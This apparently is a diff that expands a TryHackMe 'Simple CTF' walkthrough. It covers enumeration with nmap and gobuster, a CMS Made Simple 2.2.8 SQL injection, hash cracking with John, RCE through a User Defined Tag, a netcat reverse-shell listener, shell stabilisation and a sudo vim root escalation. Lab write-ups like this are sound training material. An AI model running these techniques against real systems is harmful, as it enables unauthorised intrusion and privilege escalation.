@@ -5,141 +5,309 @@
 * **Platform:** TryHackMe
 * **Room:** Simple CTF
 * **Difficulty:** Easy
-* **Category:** Web Exploitation, Password Cracking, Linux Privilege Escalation
+* **Category:** Web Exploitation, Linux Privilege Escalation
 
 ---
 
 # Objective
 
-The objective of this room was to gain initial access to the target machine, enumerate the available services, exploit a vulnerable web application to obtain remote code execution, recover user credentials, and finally escalate privileges to obtain the root flag.
+The goal of this room was to gain initial access to the target machine by exploiting a vulnerable CMS Made Simple application, obtain valid user credentials, and escalate privileges to capture both the user and root flags.
 
 ---
 
 # Enumeration
 
-The first step was to perform an Nmap scan to identify open ports and running services.
-
-The scan revealed:
-
-* FTP
-* SSH
-* HTTP
-
-Since the web server was accessible, further enumeration focused on the HTTP service.
-
----
-
-# Web Enumeration
-
-Directory enumeration was performed to discover hidden files and directories.
-
-During enumeration, a CMS Made Simple installation was discovered.
-
-The CMS version was identified and searched for known vulnerabilities.
-
----
-
-# Exploitation
-
-A public exploit for the vulnerable CMS Made Simple version was available.
-
-The exploit was used to gain code execution on the server.
-
-To verify command execution, a simple payload was executed:
-
-```php
-system("id");
-```
-
-The server returned:
-
-```
-uid=33(www-data) gid=33(www-data)
-```
-
-This confirmed successful remote command execution as the **www-data** user.
-
-A reverse shell payload was then executed to obtain an interactive shell.
-
----
-
-# Shell Stabilization
-
-After receiving the reverse shell, it was upgraded for better usability.
-
-Commands used included:
+I started by performing an Nmap scan to identify the open ports and running services.
 
 ```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
+nmap -sC -sV -A -oN nmap.txt <TARGET_IP>
 ```
 
-This provided a more stable shell for further enumeration.
+### Scan Results
+
+The scan revealed the following interesting services:
+
+| Port | Service |
+| ---- | ------- |
+| 21   | FTP     |
+| 22   | SSH     |
+| 80   | HTTP    |
+
+Since the web server was accessible, I continued with web enumeration.
 
 ---
 
-# Credential Discovery
+# Directory Enumeration
 
-While enumerating the system, configuration files containing database credentials were discovered.
-
-The recovered password was reused successfully with:
+To discover hidden directories, I used Gobuster.
 
 ```bash
-su mitch
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-Access to the **mitch** user account was obtained.
+Gobuster discovered the following directory:
+
+```text
+/simple
+```
+
+Browsing to `/simple` revealed a **CMS Made Simple** installation.
+
+---
+
+# CMS Version Identification
+
+By viewing the page source and inspecting the application, I identified the CMS version.
+
+```text
+CMS Made Simple 2.2.8
+```
+
+Identifying the exact version is important because it allows searching for publicly known vulnerabilities.
+
+---
+
+# Finding a Public Exploit
+
+Using Searchsploit, I searched for exploits affecting this CMS version.
+
+```bash
+searchsploit "CMS Made Simple 2.2.8"
+```
+
+A public exploit targeting this version was available. The exploit performs SQL Injection to extract user information from the CMS database.
+
+The extracted data included:
+
+* Username
+* Email Address
+* Password Hash
+
+---
+
+# Password Cracking
+
+After obtaining the password hash, I saved it into a file and used John the Ripper with the RockYou wordlist.
+
+```bash
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+John successfully cracked the password.
+
+Recovered credentials:
+
+```text
+Username : mitch
+Password : secret
+```
+
+---
+
+# SSH Login
+
+The recovered credentials worked successfully for SSH authentication.
+
+```bash
+ssh mitch@<TARGET_IP>
+```
+
+After logging in, I verified the current user.
+
+```bash
+whoami
+```
+
+Output:
+
+```text
+mitch
+```
 
 ---
 
 # User Flag
 
-After switching to the **mitch** account, the home directory was explored.
+The user flag was located inside Mitch's home directory.
 
-The user flag was located inside the user's home directory and successfully captured.
+```bash
+cat ~/user.txt
+```
+
+The first flag was successfully captured.
 
 ---
 
-# Privilege Escalation
+# Alternative Initial Access (Reverse Shell)
 
-Running:
+Besides SSH access, I also experimented with authenticated Remote Code Execution through **CMS Made Simple**.
+
+After logging into the CMS Admin Panel, I navigated to:
+
+```text
+Extensions
+    └── User Defined Tags
+```
+
+I created a new tag named **test** and verified code execution with the following PHP payload.
+
+```php
+system("id");
+```
+
+The application returned:
+
+```text
+uid=33(www-data) gid=33(www-data)
+```
+
+This confirmed successful command execution as the **www-data** user.
+
+---
+
+# Reverse Shell
+
+After confirming RCE, I replaced the payload with a Bash reverse shell and started a Netcat listener.
+
+Listener:
+
+```bash
+rlwrap nc -lvnp 4444
+```
+
+Once the payload executed, a reverse shell was received successfully.
+
+---
+
+# Shell Upgrade
+
+To make the reverse shell interactive, I upgraded it using Python.
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+On my attacking machine:
+
+```bash
+Ctrl + Z
+stty raw -echo
+fg
+```
+
+Back inside the reverse shell:
+
+```bash
+export TERM=xterm
+```
+
+The shell was now much easier to use for post-exploitation activities.
+
+---
+
+# Switching to Mitch
+
+Using the previously recovered password, I switched from the **www-data** account to the **mitch** user.
+
+```bash
+su mitch
+```
+
+Password:
+
+```text
+secret
+```
+
+---
+
+# Privilege Escalation Enumeration
+
+I checked the user's sudo permissions.
 
 ```bash
 sudo -l
 ```
 
-revealed:
+Output:
 
-```
+```text
 (root) NOPASSWD: /usr/bin/vim
 ```
 
-This indicated that the **mitch** user could execute Vim as root without requiring a password.
-
-Using the GTFOBins technique for Vim, a root shell was obtained.
-
-After successful privilege escalation, the root flag was retrieved from the root user's directory.
+This indicated that **mitch** could execute Vim as the root user without entering a password.
 
 ---
 
-# Skills Practiced
+# Verifying the Vim Binary
 
-* Service Enumeration
-* Directory Enumeration
-* CMS Fingerprinting
-* Public Exploit Research
-* Remote Code Execution
-* Reverse Shell Handling
-* Linux Enumeration
-* Credential Reuse
-* Shell Stabilization
-* GTFOBins Privilege Escalation
+Before using GTFOBins, I verified the installed Vim binary.
+
+```bash
+which vim
+```
+
+Output:
+
+```text
+/usr/bin/vim
+```
+
+Checking the symbolic link:
+
+```bash
+ls -l /etc/alternatives/vim
+```
+
+Output:
+
+```text
+/usr/bin/vim.basic
+```
 
 ---
 
-# Lessons Learned
+# Privilege Escalation via GTFOBins
 
-This room demonstrated the importance of proper enumeration before exploitation. Identifying the CMS version allowed the use of a known exploit to achieve remote code execution. After gaining an initial shell, careful system enumeration led to credential discovery and lateral movement to another user. Finally, understanding Linux privilege escalation techniques and GTFOBins made it possible to obtain root access.
+Using the GTFOBins technique for Vim, I launched a root shell.
+
+```bash
+sudo vim
+```
+
+Inside Vim:
+
+```vim
+:set shell=/bin/sh
+:shell
+```
+
+A root shell was successfully spawned.
+
+Verification:
+
+```bash
+whoami
+```
+
+Output:
+
+```text
+root
+```
+
+---
+
+# Root Flag
+
+After obtaining root privileges, I navigated to the root directory.
+
+```bash
+cd /root
+cat root.txt
+```
+
+The root flag was successfully captured.
 
 ---
 
@@ -148,15 +316,32 @@ This room demonstrated the importance of proper enumeration before exploitation.
 * Nmap
 * Gobuster
 * Searchsploit
+* John the Ripper
 * Netcat
+* SSH
 * Python PTY
-* Vim
 * GTFOBins
-* Linux Command Line
+* Vim
 
 ---
 
-# Conclusion
+# Skills Practiced
 
-Simple CTF is an excellent beginner-friendly machine that covers a complete penetration testing workflow, including reconnaissance, exploitation, post-exploitation, and privilege escalation. It reinforces the importance of systematic enumeration, understanding public vulnerabilities, handling reverse shells, and leveraging Linux misconfigurations to gain administrative access.
+* Network Enumeration
+* Web Enumeration
+* Directory Brute Forcing
+* CMS Fingerprinting
+* SQL Injection Exploitation
+* Password Hash Cracking
+* Reverse Shell Handling
+* Shell Stabilization
+* Linux User Enumeration
+* SSH Authentication
+* Linux Privilege Escalation
+* GTFOBins
 
+---
+
+# Lessons Learned
+
+This room demonstrated the complete penetration testing workflow—from reconnaissance and service enumeration to exploiting a vulnerable web application, cracking password hashes, obtaining remote access, upgrading shells, and finally escalating privileges using an insecure sudo configuration. It reinforced the importance of thorough enumeration, validating exploits before execution, and understanding common Linux privilege escalation techniques such as GTFOBins.
